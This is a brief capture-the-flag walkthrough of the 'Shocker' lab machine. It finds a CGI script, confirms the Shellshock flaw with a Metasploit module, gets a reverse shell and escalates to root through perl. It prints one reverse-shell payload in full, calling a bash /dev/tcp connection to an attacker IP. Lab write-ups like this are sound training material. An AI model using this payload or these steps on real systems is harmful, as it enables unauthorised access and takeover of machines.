Shocker

Target IP: 10.129.148.27

Scanning


There are two TCP ports open on the target machine: HTTP on port 80, and SSH on port 2222.

Enumeration

Port 80: HTTP

The webpage above is displayed on this port. Performing a directory search against this port shows /cgi-bin returns the HTTP code 403. However, performing a directory search using the extension .sh outputs a file called user.sh.


The script contains the content above. Is this host vulnerable to Shellshock?

Exploitation


Running a check against the host for Shellshock proved true. I ran the module scanner/http/apache_mod_cgi_bash_env, and the target host is vulnerable to Shellshock.


Setting the CMD parameter to the payload /bin/bash -i >& /dev/tcp/10.10.16.19/8443 0>&1 using the same module, I gained a reverse shell connection on port 8443.

Privilege Escalation


Looks like /usr/bin/perl can be used to gain a root shell.


And now I have a root shell.

Flags


The user.txt flag once I gained a foothold on the machine by exploiting the Shellshock vulnerability on the target machine.


The root.txt flag once I used /usr/bin/perl to spawn a root shell.
